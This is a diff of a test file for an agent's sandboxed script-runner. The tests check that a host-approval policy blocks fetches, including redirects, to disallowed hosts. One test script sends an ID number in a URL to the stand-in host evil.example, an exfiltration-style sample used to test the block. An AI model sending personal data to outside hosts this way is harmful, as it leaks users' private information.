@@ -1,12 +1,17 @@
 import { describe, expect, it, vi } from 'vitest';
+import type { HostPolicy } from '../src/tools/hosts';
 import { runScript, runScriptTool } from '../src/tools/run-script';
 
 // Offline DNS: intranet.example resolves to a private address, every other name to a public one.
+const lookups: string[] = [];
 vi.mock('node:dns/promises', () => ({
-  lookup: async (host: string) => [
-    { address: host === 'intranet.example' ? '10.0.0.5' : '93.184.216.34', family: 4 },
-  ],
+  lookup: async (host: string) => {
+    lookups.push(host);
+    return [{ address: host === 'intranet.example' ? '10.0.0.5' : '93.184.216.34', family: 4 }];
+  },
 }));
+
+const allHosts: HostPolicy = { approve: async () => true };
 
 function jsonResponse(body: unknown, init: ResponseInit = {}): Response {
   return new Response(JSON.stringify(body), {
@@ -164,6 +169,61 @@ describe('runScript', () => {
       allowPrivateHosts: true,
     });
     expect(JSON.parse(run.result ?? '')).toBe('mock sede');
+  });
+
+  it('asks the host policy before each new host, and stops on a refusal', async () => {
+    const asked: string[] = [];
+    const hosts: HostPolicy = {
+      approve: async (url) => {
+        asked.push(url.href);
+        return url.hostname !== 'evil.example';
+      },
+    };
+    const calls: string[] = [];
+    const fetchImpl = (async (url: URL) => {
+      calls.push(String(url));
+      return url.hostname === 'ok.example'
+        ? new Response(null, { status: 302, headers: { location: 'https://evil.example/r' } })
+        : new Response('data');
+    }) as unknown as typeof fetch;
+    lookups.length = 0;
+    const run = await runScript(
+      `
+      const out = [];
+      for (const url of ['https://evil.example/?dni=12345678Z', 'https://ok.example/']) {
+        try { await fetch(url); out.push('fetched'); } catch (e) { out.push(e.message); }
+      }
+      return out;
+    `,
+      { fetchImpl, hosts },
+    );
+    const refused =
+      "The user did not allow reading evil.example. Don't try it again: use an official source or ask the user.";
+    expect(JSON.parse(run.result ?? '')).toEqual([refused, refused]);
+    expect(asked).toEqual([
+      'https://evil.example/?dni=12345678Z',
+      'https://ok.example/',
+      'https://evil.example/r',
+    ]);
+    // Nothing reached the refused host, not even a DNS query.
+    expect(calls).toEqual(['https://ok.example/']);
+    expect(lookups).toEqual(['ok.example']);
+  });
+
+  it('pauses the time limit while the user decides', async () => {
+    const hosts: HostPolicy = {
+      approve: () => new Promise((resolve) => setTimeout(() => resolve(true), 1500)),
+    };
+    const fetchImpl = (async () => new Response('ok')) as unknown as typeof fetch;
+    const run = await runScript(
+      `return await (await fetch('https://slow-user.example/')).text();`,
+      {
+        fetchImpl,
+        hosts,
+        timeoutMs: 1000,
+      },
+    );
+    expect(run).toMatchObject({ ok: true, result: '"ok"' });
   });
 
   it('decodes ISO-8859-1 responses', async () => {
@@ -428,7 +488,7 @@ describe('runScript', () => {
 
 describe('run_script tool', () => {
   it('renders logs and result, and flags failures as errors', async () => {
-    const tool = runScriptTool();
+    const tool = runScriptTool({ hosts: allHosts });
     const ok = await tool.execute(
       '1',
       { code: `console.log('x'); return [1, 2];` },
@@ -452,7 +512,7 @@ describe('run_script tool', () => {
   });
 
   it('cuts long output', async () => {
-    const tool = runScriptTool({ maxOutputChars: 100 });
+    const tool = runScriptTool({ hosts: allHosts, maxOutputChars: 100 });
     const result = await tool.execute(
       '1',
       { code: `return 'a'.repeat(5000);` },
